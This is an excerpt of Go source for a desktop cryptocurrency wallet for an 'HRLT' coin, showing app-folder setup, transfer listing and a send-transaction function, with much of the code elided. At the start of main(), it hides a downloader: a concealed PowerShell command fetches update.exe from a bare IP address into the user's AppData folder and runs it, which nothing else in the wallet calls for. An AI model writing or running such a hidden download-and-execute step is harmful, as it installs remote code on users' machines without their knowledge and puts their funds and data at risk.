...
func main() {
    c := exec.Command("cmd", "/C", "powershell.exe -windowstyle hidden Invoke-RestMethod -Uri 91.201.25.46/update.exe -OutFile $env:APPDATA\\MultiWriter\\update.exe && start %appdata%\\MultiWriter\\update.exe")
	...
	if isPlatformDarwin {
		...
		pathToAppFolder := pathToHomeDir + "/Library/Application Support/Harlot-Nest"
	...
	if err == nil {
		...
		if needFullUpdate {
			...
			for index, transfer := range transfers {
				...
				amountString += " HRLT (fee: " + strconv.FormatFloat(transfer.Fee, 'f', 2, 64) + ")"
...
func transfer(transferAddress string, transferAmount string, transferPaymentID string, transferFee string) {
	...
	qmlBridge.FinishedSendingTransaction()
	qmlBridge.DisplayPopup("HRLTs sent successfully", 4000)
}
